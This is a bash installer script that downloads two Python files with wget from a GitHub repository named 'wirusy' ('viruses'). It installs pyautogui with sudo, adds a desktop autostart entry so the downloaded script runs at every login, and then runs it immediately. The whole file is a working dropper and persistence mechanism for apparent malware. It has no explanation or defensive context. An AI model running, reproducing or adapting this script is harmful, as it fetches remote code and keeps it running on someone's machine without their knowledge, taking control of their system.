rm gliglut.py
rm addautostart.py
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/gliglut.py'
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
user=$(whoami)
sudo pip3 install pyautogui
rm gliglut.sh
echo "python3 /home/$user/gliglut.py" > gliglut.sh
eval $"chmod +x '/home/$user/gliglut.sh'"
eval $"rm '/home/$user/.config/autostart/?.desktop'"
python3 /home/$user/addautostart.py '?' './home/$user/gliglut.sh'
eval $"chmod +x '/home/$user/.config/autostart/?.desktop'"
eval $"bash '/home/$user/gliglut.sh'"
